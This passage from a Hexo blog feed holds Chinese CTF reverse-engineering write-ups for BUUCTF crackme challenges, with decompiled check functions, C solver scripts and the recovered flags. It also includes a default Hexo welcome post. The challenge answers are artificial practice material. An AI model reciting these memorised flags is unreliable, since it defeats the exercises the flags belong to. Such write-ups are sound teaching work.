97;</span><br><span class="line">      v15 &#x3D; 78;</span><br><span class="line">      v16 &#x3D; 72;</span><br><span class="line">      v17 &#x3D; 51;</span><br><span class="line">      v18 &#x3D; 110;</span><br><span class="line">      v19 &#x3D; 103;</span><br><span class="line">      sub_4010F0(&amp;v9, 0, 10);</span><br><span class="line">      memset(&amp;v25, 0, 0xFFFFu);</span><br><span class="line">      v6 &#x3D; sub_401000(&amp;v25, strlen(&amp;v25));</span><br><span class="line">      memset(&amp;v25, 0, 0xFFFFu);</span><br><span class="line">      v26 &#x3D; v23;</span><br><span class="line">      v25 &#x3D; v22;</span><br><span class="line">      v27 &#x3D; v24;</span><br><span class="line">      v7 &#x3D; sub_401000(&amp;v25, strlen(&amp;v25));</span><br><span class="line">      if ( String &#x3D;&#x3D; v9 + 34</span><br><span class="line">        &amp;&amp; v21 &#x3D;&#x3D; v13</span><br><span class="line">        &amp;&amp; 4 * v22 - 141 &#x3D;&#x3D; 3 * v11</span><br><span class="line">        &amp;&amp; v23 &#x2F; 4 &#x3D;&#x3D; 2 * (v16 &#x2F; 9)</span><br><span class="line">        &amp;&amp; !strcmp(v6, &quot;ak1w&quot;)</span><br><span class="line">        &amp;&amp; !strcmp(v7, &quot;V1Ax&quot;) )</span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, &quot;U g3t 1T!&quot;, &quot;@_@&quot;, 0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( a5 !&#x3D; 1 &amp;&amp; a5 !&#x3D; 2 )</span><br><span class="line">    return 0;</span><br><span class="line">  EndDialog(hDlg, a5);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数sub_4010F0(&amp;v9, 0, 10)伪代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_4010F0(int a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  int i; &#x2F;&#x2F; esi</span><br><span class="line">  int v5; &#x2F;&#x2F; ecx</span><br><span class="line">  int v6; &#x2F;&#x2F; edx</span><br><span class="line"></span><br><span class="line">  result &#x3D; a3;</span><br><span class="line">  for ( i &#x3D; a2; i &lt;&#x3D; a3; a2 &#x3D; i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 &#x3D; 4 * i;</span><br><span class="line">    v6 &#x3D; *(4 * i + a1);</span><br><span class="line">    if ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">    &#123;</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v6 &gt; *(a1 + 4 * result) )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( i &gt;&#x3D; result )</span><br><span class="line">            break;</span><br><span class="line">          ++i;</span><br><span class="line">          *(v5 + a1) &#x3D; *(a1 + 4 * result);</span><br><span class="line">          if ( i &gt;&#x3D; result )</span><br><span class="line">            break;</span><br><span class="line">          while ( *(a1 + 4 * i) &lt;&#x3D; v6 )</span><br><span class="line">          &#123;</span><br><span class="line">            if ( ++i &gt;&#x3D; result )</span><br><span class="line">              goto LABEL_13;</span><br><span class="line">          &#125;</span><br><span class="line">          if ( i &gt;&#x3D; result )</span><br><span class="line">            break;</span><br><span class="line">          v5 &#x3D; 4 * i;</span><br><span class="line">          *(a1 + 4 * result) &#x3D; *(4 * i + a1);</span><br><span class="line">        &#125;</span><br><span class="line">        --result;</span><br><span class="line">      &#125;</span><br><span class="line">      while ( i &lt; result );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">    *(a1 + 4 * result) &#x3D; v6;</span><br><span class="line">    sub_4010F0(a1, a2, i - 1);</span><br><span class="line">    result &#x3D; a3;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是将v9-v19进行变化，得到新的v9-v19，以下为脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int __cdecl sub_4010F0(char *a1, int a2, int a3);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char v9[11] &#x3D; &#123;90,74,83,69,67,97,78,72,51,110,103&#125;;</span><br><span class="line">    sub_4010F0(v9, 0, 10);</span><br><span class="line">    for (int j&#x3D;0;j&lt;11;j++)</span><br><span class="line">        printf(&quot;%c&quot;,v9[j]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int __cdecl sub_4010F0(char *a1, int a2, int a3)</span><br><span class="line">&#123;</span><br><span class="line">    int result;</span><br><span class="line">    int i;</span><br><span class="line">    int v5;</span><br><span class="line">    int v6;</span><br><span class="line">    result &#x3D; a3;</span><br><span class="line">    for ( i &#x3D; a2; i &lt;&#x3D; a3; a2 &#x3D; i )</span><br><span class="line">    &#123;</span><br><span class="line">        v5 &#x3D; i;</span><br><span class="line">        v6 &#x3D; a1[i];</span><br><span class="line">        if ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">        &#123;</span><br><span class="line">            do</span><br><span class="line">            &#123;</span><br><span class="line">                if ( v6 &gt; a1[result] )</span><br><span class="line">                &#123;</span><br><span class="line">                    if ( i &gt;&#x3D; result )</span><br><span class="line">                        break;</span><br><span class="line">                    ++i;</span><br><span class="line">                    a1[v5] &#x3D; a1[result];</span><br><span class="line">                    if ( i &gt;&#x3D; result )</span><br><span class="line">                        break;</span><br><span class="line">                    while ( a1[i] &lt;&#x3D; v6 )</span><br><span class="line">                    &#123;</span><br><span class="line">                        if ( ++i &gt;&#x3D; result )</span><br><span class="line">                        goto LABEL_13;</span><br><span class="line">                    &#125;</span><br><span class="line">                    if ( i &gt;&#x3D; result )</span><br><span class="line">                        break;</span><br><span class="line">                    v5 &#x3D; i;</span><br><span class="line">                    a1[result] &#x3D; a1[i];</span><br><span class="line">                &#125;</span><br><span class="line">                --result;</span><br><span class="line">            &#125;</span><br><span class="line">            while ( i &lt; result );</span><br><span class="line">        &#125;</span><br><span class="line">    LABEL_13:</span><br><span class="line">        a1[result] &#x3D; v6;</span><br><span class="line">        sub_4010F0(a1, a2, i - 1);</span><br><span class="line">        result &#x3D; a3;</span><br><span class="line">        ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/3.png"></p><p>接着查看函数sub_401000</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">BOOL __userpurge DialogFunc@&lt;eax&gt;(int a1@&lt;edi&gt;, int a2@&lt;esi&gt;, HWND hDlg, UINT a4, WPARAM a5, LPARAM a6)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v6; &#x2F;&#x2F; esi</span><br><span class="line">  const char *v7; &#x2F;&#x2F; edi</span><br><span class="line">  int v9; &#x2F;&#x2F; [esp+4h] [ebp-20030h]</span><br><span class="line">  int v10; &#x2F;&#x2F; [esp+8h] [ebp-2002Ch]</span><br><span class="line">  int v11; &#x2F;&#x2F; [esp+Ch] [ebp-20028h]</span><br><span class="line">  int v12; &#x2F;&#x2F; [esp+10h] [ebp-20024h]</span><br><span class="line">  int v13; &#x2F;&#x2F; [esp+14h] [ebp-20020h]</span><br><span class="line">  int v14; &#x2F;&#x2F; [esp+18h] [ebp-2001Ch]</span><br><span class="line">  int v15; &#x2F;&#x2F; [esp+1Ch] [ebp-20018h]</span><br><span class="line">  int v16; &#x2F;&#x2F; [esp+20h] [ebp-20014h]</span><br><span class="line">  int v17; &#x2F;&#x2F; [esp+24h] [ebp-20010h]</span><br><span class="line">  int v18; &#x2F;&#x2F; [esp+28h] [ebp-2000Ch]</span><br><span class="line">  int v19; &#x2F;&#x2F; [esp+2Ch] [ebp-20008h]</span><br><span class="line">  CHAR String; &#x2F;&#x2F; [esp+30h] [ebp-20004h]</span><br><span class="line">  char v21; &#x2F;&#x2F; [esp+31h] [ebp-20003h]</span><br><span class="line">  char v22; &#x2F;&#x2F; [esp+32h] [ebp-20002h]</span><br><span class="line">  char v23; &#x2F;&#x2F; [esp+33h] [ebp-20001h]</span><br><span class="line">  char v24; &#x2F;&#x2F; [esp+34h] [ebp-20000h]</span><br><span class="line">  char v25; &#x2F;&#x2F; [esp+10030h] [ebp-10004h]</span><br><span class="line">  char v26; &#x2F;&#x2F; [esp+10031h] [ebp-10003h]</span><br><span class="line">  char v27; &#x2F;&#x2F; [esp+10032h] [ebp-10002h]</span><br><span class="line">  int v28; &#x2F;&#x2F; [esp+20028h] [ebp-Ch]</span><br><span class="line">  int v29; &#x2F;&#x2F; [esp+2002Ch] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  __alloca_probe();</span><br><span class="line">  if ( a4 &#x3D;&#x3D; 272 )</span><br><span class="line">    return 1;</span><br><span class="line">  v29 &#x3D; a2;</span><br><span class="line">  v28 &#x3D; a1;</span><br><span class="line">  if ( a4 !&#x3D; 273 )</span><br><span class="line">    return 0;</span><br><span class="line">  if ( a5 &#x3D;&#x3D; 1001 )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(&amp;String, 0, 0xFFFFu);</span><br><span class="line">    GetDlgItemTextA(hDlg, 1000, &amp;String, 0xFFFF);</span><br><span class="line">    if ( strlen(&amp;String) &#x3D;&#x3D; 8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 &#x3D; 90;</span><br><span class="line">      v10 &#x3D; 74;</span><br><span class="line">      v11 &#x3D; 83;</span><br><span class="line">      v12 &#x3D; 69;</span><br><span class="line">      v13 &#x3D; 67;</span><br><span class="line">      v14 &#x3D; 97;</span><br><span class="line">      v15 &#x3D; 78;</span><br><span class="line">      v16 &#x3D; 72;</span><br><span class="line">      v17 &#x3D; 51;</span><br><span class="line">      v18 &#x3D; 110;</span><br><span class="line">      v19 &#x3D; 103;</span><br><span class="line">      sub_4010F0(&amp;v9, 0, 10);</span><br><span class="line">      memset(&amp;v25, 0, 0xFFFFu);</span><br><span class="line">      v6 &#x3D; sub_401000(&amp;v25, strlen(&amp;v25));</span><br><span class="line">      memset(&amp;v25, 0, 0xFFFFu);</span><br><span class="line">      v26 &#x3D; v23;</span><br><span class="line">      v25 &#x3D; v22;</span><br><span class="line">      v27 &#x3D; v24;</span><br><span class="line">      v7 &#x3D; sub_401000(&amp;v25, strlen(&amp;v25));</span><br><span class="line">      if ( String &#x3D;&#x3D; v9 + 34</span><br><span class="line">        &amp;&amp; v21 &#x3D;&#x3D; v13</span><br><span class="line">        &amp;&amp; 4 * v22 - 141 &#x3D;&#x3D; 3 * v11</span><br><span class="line">        &amp;&amp; v23 &#x2F; 4 &#x3D;&#x3D; 2 * (v16 &#x2F; 9)</span><br><span class="line">        &amp;&amp; !strcmp(v6, &quot;ak1w&quot;)</span><br><span class="line">        &amp;&amp; !strcmp(v7, &quot;V1Ax&quot;) )</span><br><span class="line">      &#123;</span><br><span class="line">        MessageBoxA(hDlg, &quot;U g3t 1T!&quot;, &quot;@_@&quot;, 0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( a5 !&#x3D; 1 &amp;&amp; a5 !&#x3D; 2 )</span><br><span class="line">    return 0;</span><br><span class="line">  EndDialog(hDlg, a5);</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/4.png"></p><p>我们可以猜测这里应该是base64加密。</p><h2 id="3-得出flag"><a href="#3-得出flag" class="headerlink" title="3.得出flag"></a>3.得出flag</h2><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/8.png"></p><p>string是一个8位的数组，再结合最开始的定义：</p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/5.png"></p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/6.png"></p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/7.png"></p><p>而且v22-v24压入了同一处，v25-v27压入了同一处。<br>之后将”ak1w”和”V1Ax”进行base64解密。前三个为ak1w的，后三个为V1Ax的。</p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/9.png"></p><p>将这些字符拼接再一起就是flag。<br>由于v7是经v22、v23、v24得来的，所WP1先输入，jMp后输入。</p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/10.png"></p><p>flag{UJWP1jMp}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2021/01/19/hello-world/"/>
      <url>2021/01/19/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><a id="more"></a><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假第一周</title>
      <link href="2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/"/>
      <url>2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#SimpleRev">题目链接</a><br>查看文件信息</p><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/SimpleRev_1.png"></p><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/SimpleRev_2.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 Decry()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; &#x2F;&#x2F; [rsp+Fh] [rbp-51h]</span><br><span class="line">  int v2; &#x2F;&#x2F; [rsp+10h] [rbp-50h]</span><br><span class="line">  int v3; &#x2F;&#x2F; [rsp+14h] [rbp-4Ch]</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+18h] [rbp-48h]</span><br><span class="line">  int v5; &#x2F;&#x2F; [rsp+1Ch] [rbp-44h]</span><br><span class="line">  char src[8]; &#x2F;&#x2F; [rsp+20h] [rbp-40h]</span><br><span class="line">  __int64 v7; &#x2F;&#x2F; [rsp+28h] [rbp-38h]</span><br><span class="line">  int v8; &#x2F;&#x2F; [rsp+30h] [rbp-30h]</span><br><span class="line">  __int64 v9; &#x2F;&#x2F; [rsp+40h] [rbp-20h]</span><br><span class="line">  __int64 v10; &#x2F;&#x2F; [rsp+48h] [rbp-18h]</span><br><span class="line">  int v11; &#x2F;&#x2F; [rsp+50h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v12; &#x2F;&#x2F; [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v12 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  *(_QWORD *)src &#x3D; &#39;SLCDN&#39;;</span><br><span class="line">  v7 &#x3D; 0LL;</span><br><span class="line">  v8 &#x3D; 0;</span><br><span class="line">  v9 &#x3D; &#39;wodah&#39;;</span><br><span class="line">  v10 &#x3D; 0LL;</span><br><span class="line">  v11 &#x3D; 0;</span><br><span class="line">  text &#x3D; (char *)join(key3, &amp;v9);               &#x2F;&#x2F; text&#x3D;killshadow</span><br><span class="line">  strcpy(key, key1);                            &#x2F;&#x2F; key&#x3D;ADSFKDNCLS</span><br><span class="line">  strcat(key, src);</span><br><span class="line">  v2 &#x3D; 0;</span><br><span class="line">  v3 &#x3D; 0;</span><br><span class="line">  getchar();</span><br><span class="line">  v5 &#x3D; strlen(key);</span><br><span class="line">  for ( i &#x3D; 0; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( key[v3 % v5] &gt; 64 &amp;&amp; key[v3 % v5] &lt;&#x3D; 90 )&#x2F;&#x2F; 大写变小写</span><br><span class="line">      key[i] &#x3D; key[v3 % v5] + 32;</span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Please input your flag:&quot;, src);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 &#x3D; getchar();</span><br><span class="line">    if ( v1 &#x3D;&#x3D; 10 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v1 &#x3D;&#x3D; 32 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v1 &lt;&#x3D; 96 || v1 &gt; 122 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v1 &gt; 64 &amp;&amp; v1 &lt;&#x3D; 90 )</span><br><span class="line">          str2[v2] &#x3D; (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] &#x3D; (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( !(v3 % v5) )</span><br><span class="line">        putchar(32);</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !strcmp(text, str2) )</span><br><span class="line">    puts(&quot;Congratulation!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Try again!\n&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个伪代码就是将key由大写变为小写，即key = “ADSFKNDCLS”。<br>然后输入v1，我们对v1进行运算得到str2，将str2与text比较相同就正确。这里v1就是flag，我们知道str2，所以对v1进行逆运算，以下为脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char text[]&#x3D;&quot;killshadow&quot;;</span><br><span class="line">    char key[]&#x3D;&quot;adsfkndcls&quot;;</span><br><span class="line">    int v5 &#x3D; strlen(key),i,j,v3&#x3D;0;</span><br><span class="line">    char flag[v5];</span><br><span class="line">    for ( i &#x3D; 0; i &lt; v5; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        if ( key[v3 % v5] &gt; 64 &amp;&amp; key[v3 % v5] &lt;&#x3D; 90 )</span><br><span class="line">            key[i] &#x3D; key[v3 % v5] + 32;</span><br><span class="line">        ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i&#x3D;0;i&lt;v5;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j&#x3D;0;j&lt;5;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag[i] &#x3D; text[i] - 97 + 26*j + 39 -97 + key[i];</span><br><span class="line">            if(flag[i] &gt;&#x3D; 65 &amp;&amp; flag[i] &lt;&#x3D; 90)</span><br><span class="line">                printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/SimpleRev_3.png"></p><p>最后在外面套上falg。</p><h1 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h1><p><a href="https://buuoj.cn/challenges#xor">题目链接</a><br>查看文件信息</p><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/xor_1.png"></p><p>ida查看main函数伪代码</p><p><img src="/2021/01/16/%E5%AF%92%E5%81%87%E7%AC%AC%E4%B8%80%E5%91%A8/xor_2.png"></p><p>意思就是输入33个字符，后一位与前一位进行异或运算，异或后的结果与global比较，相同则成功。我们对global进行逆运算，得出的即是flag。两次异或会还原，所以异或的逆运算还是异或。<br>下面为脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char v6[33];</span><br><span class="line">    char 